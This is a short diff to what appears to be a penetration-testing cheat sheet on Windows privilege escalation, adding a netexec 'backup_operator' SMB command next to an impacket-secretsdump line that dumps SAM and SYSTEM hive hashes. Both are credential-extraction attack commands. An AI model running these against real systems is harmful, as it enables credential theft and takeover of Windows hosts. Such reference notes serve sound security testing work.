@@ -402,6 +402,10 @@ copy sam and system to kali
 
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
+netexec
+```
+nxc smb ip -u username -p pwd -M backup_operator
+```
 ### SeRestorePrivilege To System
 ```
 Terminal Version:
